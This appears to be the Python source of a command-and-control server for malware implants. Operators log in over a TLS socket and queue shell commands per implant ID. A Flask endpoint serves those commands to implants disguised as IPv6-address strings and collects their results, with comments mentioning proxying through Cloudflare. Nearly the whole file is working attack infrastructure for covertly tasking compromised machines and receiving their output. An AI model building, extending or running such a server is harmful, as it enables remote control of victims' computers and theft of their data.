import logging
import socket
import ssl
import threading
from queue import Queue, Empty
from threading import Thread
import secrets

from flask import Flask, request

import ipv6_encoder
import pw_hash

app = Flask(__name__)
implant_checkout = {}

operator_session_tokens = set()

# Command queues for each implant identified by a 4-digit ID
implant_command_queues = {
    "1234": Queue(),
    "5678": Queue(),
}

# Result storage for each user
# Keeping this as a nested dict for now
result_storage = {
    """
    This is a nested dict for now
    The intention is that a user will interact with multiple implants
    Then to get the results from individual implants, they search for the implant key
    The value they get is the first element which can then be popped to move others up
    """
    "tester": [],
    "matt_tester": [],
}

# Logger configuration
logger = logging.getLogger(__name__)
logging.basicConfig(
    filename='server.log',
    level=logging.DEBUG,
    format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)


def add_user(new_user_id):
    """
    Adds a new user to the result storage dict
    :param new_user_id: The users ID to add
    :return: Nothing
    """
    logger.info(f"adding new user {new_user_id}")
    result_storage.setdefault(new_user_id, [])


def add_command(implant_id, operator, command):
    """
    Add a command to the implants queue
    :param implant_id: The implant ID to send the command to
    :param operator: The operator who set the command
    :param command: The command itself to be run
    :return: Nothing
    """
    queue = implant_command_queues.get(implant_id)
    if queue:
        queue.put((operator, command))
        logger.info(f"Added command for implant {implant_id}: {command}")
    else:
        logger.error(f"No queue found for implant {implant_id}, creating one")
        implant_command_queues.setdefault(implant_id, Queue())
        implant_command_queues[implant_id].put(command)
        logger.info(f"Added command for implant {implant_id}: {command}")


def get_results(user_id):
    """
    Get the users result storage
    :param user_id: The user ID to get the storage for
    :return: The results if any
    """
    fetched = str(result_storage.get(user_id, []))
    logger.info(f"got results {fetched}")
    result_storage.pop(user_id, 0)
    return fetched


def get_waiting_command(implant_id):
    """
    Gets the oldest command waiting in the implants queue
    :param implant_id: The implant ID to get the queue for
    :return: Either the operator name who set it and the command or False/False
    """
    queue = implant_command_queues.get(implant_id)
    if queue:
        try:
            operator, command = queue.get()
            logger.info(f"Fetched command for implant {implant_id}: Operator={operator}, Command={command}")
            return operator, command
        except Empty:
            logger.info(f"No commands available for {implant_id}")
            return False, False
    else:
        logger.info(f"No queue found for {implant_id}")
        return False, False


def handle_update(uname, implant_id, result):
    """
    Handle implants sending results of commands to the server
    :param uname: The user who should get the results
    :param implant_id: The implant ID associated with the command
    :param result: The result sent by the implant
    :return: Boolean: True if success, otherwise returns error
    """
    try:
        # decoded_res = ipv6_encoder.ipv6_to_string(result)
        logger.info(f"first 10 bytes {result[:10]}")
        dict_store = {implant_id: result}
        result_storage.setdefault(uname, []).append(dict_store)
        logger.info(f"new result saved for user: {uname}")
        return True
    except Exception as e:
        logger.error(f"error occurred saving result for implant: {e}")
        return e


def checkout_command(imp_id, user_id):
    """
    Creates a queue that has the implant ID as the key and adds the user to it
    Informs the server who needs the latest result
    :param imp_id: The ID for the implant
    :param user_id: The ID for the user who sent the command
    :return:
    """
    implant_checkout.setdefault(imp_id, Queue())
    implant_checkout[imp_id].put(user_id)


def handle_client(client_socket):
    """
    Handles the client sending and retrieving info
    :param client_socket: The socket object the client uses to connect
    :return: Uses the client socket to send data, function returns nothing
    """
    try:
        # Receive the client's initial message
        client_request = client_socket.recv(1024).decode()

        # Check what type of message it is first before processing further
        request_type, *remainder = client_request.split(" ", 1)

        match request_type:
            case "AUTH":
                logger.info("authenticating user")
                request_type, uname, passwd = client_request.split(" ", 2)
                logger.info(f"checking authentication details for {uname}")
                if pw_hash.compare_hash(uname, passwd):
                    logger.info("user authenticated, generating session token")
                    returned_token = secrets.token_hex()
                    client_socket.send(returned_token.encode())
                    operator_session_tokens.add(returned_token)
                else:
                    client_socket.send("Bad username or password\n".encode())

            case "PUB":
                logger.info("request to send command, attempting")
                request_type, implant_id, uname, token, *command = client_request.split(" ", 4)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    command = command[0] if command else ""
                    add_command(implant_id, uname, command)
                    client_socket.send("Message published\n".encode())
                    logger.info(f"Message: {command} sent to implant_id: {implant_id}")
                else:
                    logger.error("bad token")
                    client_socket.send("Bad token\n".encode())

            case "SUB":
                logger.info("controller requesting implant last messages")
                request_type, uname, token, *message = client_request.split(" ", 3)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    results = get_results(uname)
                    client_socket.send(results.encode())
                    logger.info(f"sent controller results {results}")
                else:
                    client_socket.send(f"Bad token\n".encode())
                    logger.error("bad token")

            case _:
                logger.error(f"unknown command: {request_type}")
                client_socket.send("Unknown command\n".encode())

    except Exception as e:
        logger.error(f"Error occurred when trying to receive connection {e}")
    finally:
        client_socket.close()


@app.route('/<path:path>', methods=['GET'])
def catch_all_get(path):
    """
    Handles how implants query for waiting commands
    :param path: This represents the implant ID
    :return: Either the waiting command or error
    """
    # Get the message FIFO
    logger.info("GET incoming")
    try:
        operator, command = get_waiting_command(path)
        if operator and command is False:
            logger.error("error")
            return "error"
        checkout_command(path, operator)
        command = ipv6_encoder.string_to_ipv6(command)
        logger.info("sending command to implant")
        return command
    except Exception as e:
        logger.error(f"error: {e}")
        return "error"


@app.route('/<path:path>', methods=['POST'])
def catch_all_post(path):
    """
    Handles the incoming data streams from an implant proxied through Cloudflare
    :param path: This represents the implant ID
    :return: Either 200 or error
    """
    try:
        logger.info(f"{path} sending us data")
        # Get the data
        result = request.get_json()
        # The result comes in as a JSON object under the field msg
        result = result.get("msg")
        # Check which operator is waiting for a result
        queue = implant_checkout[path]
        logger.info("got queue for operator")
        operator = queue.get()
        logger.info(f"sending {operator} command")
        decoded_res = ipv6_encoder.ipv6_to_string(result.split("\n"))
        handle_update(operator, path, decoded_res)
        return "200"
    except Exception as e:
        logger.error(f"error getting data: {e}")
        return "error"


def start_flask():
    app.run()


def start_server():
    """
    Start the socket server and the flask server
    Run an infinite loop until cancelled to handle socket requests
    :return: Nothing
    """
    flask_thread = Thread(target=start_flask)
    flask_thread.start()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))  # Bind to any available interface
    server.listen(5)
    server_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    server_context.minimum_version = ssl.TLSVersion.TLSv1_3
    server_context.maximum_version = ssl.TLSVersion.TLSv1_3
    server_context.load_cert_chain(certfile="server.pem")
    server_context.verify_mode = ssl.CERT_NONE
    secure_socket = server_context.wrap_socket(
        server,
        server_side=True,
    )
    logger.info("TLS socket started on port 9999\n")

    while True:
        client_socket, addr = secure_socket.accept()
        logger.info(f"Accepted connection from: {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()


if __name__ == "__main__":
    start_server()
